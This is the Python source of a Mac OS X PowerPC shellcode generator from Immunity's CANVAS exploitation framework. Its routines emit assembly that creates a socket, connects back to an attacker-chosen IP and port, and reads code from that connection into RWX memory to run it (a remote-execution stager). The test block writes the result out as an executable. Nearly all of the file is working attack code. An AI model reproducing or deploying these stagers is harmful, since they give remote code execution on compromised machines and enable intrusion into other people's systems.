#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
MacOSX PowerPC shellcode generator
"""

import sys
sys.path.append('.')
from ppcShellcodeGenerator import ppc
from exploitutils import *
from MOSDEF import mosdef

notes="""
on read_exec, r31 maintains the mmap addr
socket is at r24
"""

static_registers = {'mmapaddr': "r31", 'socket': "r24"}
syscall={"SOCKET":97, "CONNECT":98, "READ":3, "EXIT":1}

class osxPPC(ppc):
    def __init__(self):
        ppc.__init__(self)
        #TODO: GOFindSock
        # need recv_loop function (and need to define ret in assembler) <- ???
        self.handlers["socket"]=self.socket
        self.handlers["connect"]=self.connect
        self.handlers["exit"]=self.exit
        self.handlers["loopme"]=self.loopme
        self.handlers["RecvExec"]=self.recv_exec
        self.handlers["sendreg"]=self.sendreg
        self.handlers["read_and_exec_loop"]=self.read_and_exec_loop
        self.handlers["RecvExecLoop"]=self.read_and_exec_loop
        self.handlers["subsp"]=self.subsp
    
    def reset(self):
        ppc.reset(self)
    
    def loopme(self,args):
        code="""
        loopme:
            ba loopme
            nop
        """
        self.code+=code
        
    def subsp(self,args):
        "used to normalize esp"
        code="""
        stwu r1, SUBVAL(r1)
        """.replace("SUBVAL",str(args[0]))
        self.code+=code
        
    def exit(self,args):
        code="""exit:
            li   r0,1
            li   r3, 1
            sc
        """
        self.code+=code
        
    def socket(self,args):
        protocol="SOCK_STREAM"
        if args!=None and "protocol" in args:
            protocol=args["protocol"]
        prot2int={ "SOCK_STREAM": 1, "SOCK_DGRAM" : 0}
        pint=prot2int[protocol]
        sys_socket = syscall["SOCKET"]
        code="""createsocket:
            li   r3, 2 
            li   r4, PINT
            xor  r5,r5,r5
            li   r0, SYS_SOCKET
            sc
            xor  r6,r6,r6
            mr   socket_reg, r3
        """ 
        # XXX:
        # the nop (xor r6,r6,r6) must be changed for a bl to smt to retry
        
        code=code.replace("PINT",uint32fmt(pint))
        code=code.replace("SYS_SOCKET","0x%8.8x"% sys_socket)
        code=code.replace("socket_reg",static_registers["socket"])
        self.code+=code

    def connect(self,args):
        if "ipaddress" not in args:
            print "No ipaddress passed to connect!!!"
        if "port" not in args:
            print "no port in args of connect"
        ipaddress=args["ipaddress"]
        port=args["port"]

        sys_connect = syscall["CONNECT"]
        self.socket(args)
        code="""
        stwu     r1, -32(r1)        
        lis      r4, AF_FAMILY
        ori      r4, r4, PORTWORD         
        stw      r4, 0(r1)
        lis      r4, IPWORD1
        ori      r4, r4, IPWORD2
        stw      r4, 4(r1)      ! ip
        xor      r5,r5,r5
        stw      r5,  8(r1)     ! zero
        stw      r5,  0xc(r1)   ! zero
        mr       r4, r1
        addi     r5, r5, 16
        li       r0, SYS_CONNECT
        sc                      ! connect( )
        xor      r6,r6,r6
        """
        # this is called after socket, so r3 have the sockfd
        
        code=code.replace("PORTWORD", uint16fmt( dInt(port)))        
        code=code.replace("AF_FAMILY", uint16fmt( 0x2)) # AF_INET
        ip = str2bigendian(socket.inet_aton(socket.gethostbyname(ipaddress)))
        code=code.replace("IPWORD1", uint16fmt((ip >>16)&0xffff) )
        code=code.replace("IPWORD2", uint16fmt(ip & 0xffff) )
        code=code.replace("SYS_CONNECT","0x%8.8x"%  sys_connect)
        code=code.replace("socket_reg",static_registers["socket"])
        
        self.code+=code
        
    def recv_exec(self,args):
        """
        Note: 
            
        """
        # do we loop on fail? do we exit?
        code="""mr       r3, socket_reg
        mr       r4, r1   ! variable 0(r1)
        li       r5, 4    ! size: 4
        li       r0, 3
        sc                ! read(fd, buf, 4)
        xor      r6,r6, r6

        lwz      r5, 0(r1)  ! supplied size
        sub      r1, r5, r1 ! make some space for the buf 
        mr       r3, socket_reg
        mr       r4, r1
        li       r0, 3
        sc
        xor      r6, r6,r6
        mtctr    r1
        bctr
        """
        code=code.replace("socket_reg",static_registers["socket"])
        self.code+=code
        
    def sendreg(self,args):
        """Send 4 bytes which are in one register down the wire in big endian format"""

        fdreg = args["fdreg"]
        print "fdreg=%s"%fdreg

        code="""mr r3, FDREG
        mr      r4, r1
        stwu    REGTOSEND, 0(r4)  
        li      r5, 4
        xor     r6,r6,r6
        li      r0, 4  ! write(fd, buf, 4, 0)
        sc
        xor     r6,r6,r6
        """
        code=code.replace("FDREG",args["fdreg"])
        code=code.replace("REGTOSEND",args["regtosend"])
        self.code+=code
        #print self.code
        
    # IMPORTANT NOTE
    # Apparently mmap needs r9 goes for offset instead of r8
    def read_and_exec_loop(self,args):
        #the core mosdef loop
        code = """xor      r3,r3,r3   ! we dont need to supply an address
        lis      r4, 0x1    ! allocating 0x10000 (enough, i belive)
        li       r5,  7     ! PROT_EXEC | PROT_READ | PROT_WRITE
        li       r6, 4098 ! MAP_ANON | MAP_PRIVATE
        li       r7, -1
        li       r0, 197
        li       r8, 0   
        li       r9,0      ! this is the real mmap offset
        sc                  ! mmap(0, 0x10000, 7, 0x1002, -1, 0) 
        xor      r3, r3, r3
        mr       mmapaddr_reg, r3
        
read_exec:  
        li       r3, FD
        mr       r4, mmapaddr_reg   ! variable &mmapaddr
        li       r5, 4    ! size: 4
        li       r0, 3
        sc                ! read(fd, buf, 4)
        bl read_exec
        li       r0, 3
        ! if that syscall fail, we should exit, else we'll continue
        ! and try to read an unknown amount of data in the next read (r13 not filled)
        ! and not_enough() enters in an infinite loop
        cmpdi    r3, 0 ! if read() <= 0: exit
        xor      r3, r3, r3
        ble_     exit ! one day i'll have my op- opcodes.
        lwz      r13, 0(mmapaddr_reg)  ! supplied size
        mr       r14, mmapaddr_reg

not_enough:
        subf     r13, r3, r13
        mr       r5, r13
        add      r14, r14, r3 ! r4 temporal offset into buf
        li       r3, FD
        mr       r4, r14     ! mmaped var
        li       r0, 3
        sc
        bl read_exec
        cmpw     r3, r13
        blt      not_enough
        
        mtctr    mmapaddr_reg
        bctrl
        bl read_exec
exit:
        li   r0,1
        ! we come here after read_exec() fails, so we have r3 = 0 (xor r3, r3, r3 before the branch)
        sc
        """
        code=code.replace("FD", str(args["fd"]))
        code=code.replace("mmapaddr_reg",static_registers["mmapaddr"])
        self.code+=code
        
    def test(self):
        #self.addAttr("GOFindSock",None)
        #self.addAttr("loopme",None)
        #self.addAttr("connect",{"ipaddress": "10.0.0.21", "port": "4444"})
        self.addAttr("RecvExec",None)
        self.addAttr("exit",None)
    
if __name__=="__main__":
    app=osxPPC()
    app.test()
    data=app.get()
    from MOSDEF import makeexe
    print "Length of shellcode=%d"%len(data)
    code=app.getcode()
    print code
    lines=code.splitlines()
    print "code=%s"%lines[52:54]
    data2=makeexe.makeosxexePPC(data) # XXX
    f=file("hi","wb")
    import os
    os.system("chmod +x hi")
    f.write(data2)

